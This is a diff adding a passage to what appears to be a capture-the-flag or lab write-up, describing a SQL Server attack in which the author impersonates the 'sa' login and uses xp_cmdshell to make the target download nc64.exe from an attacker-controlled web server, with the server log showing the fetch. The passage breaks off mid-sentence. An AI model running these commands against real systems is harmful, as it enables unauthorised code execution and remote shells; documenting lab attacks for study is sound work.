@@ -260,5 +260,17 @@ A powershell reverse shell payload fails, it gets blocked by AV
 
 Ill try doing this with `nc64.exe` instead
 
+```python
+EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'powershell -c wget http://10.10.14.61/nc64.exe -o C:\ProgramData\nc64.exe';
+```
 
+![](Pasted%20image%2020261003142114.png)
+
+```python
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.66.164 - - [03/Oct/2026 14:20:57] "GET /nc64.exe HTTP/1.1" 200 -
+```
+
+I managed to transfet 
 
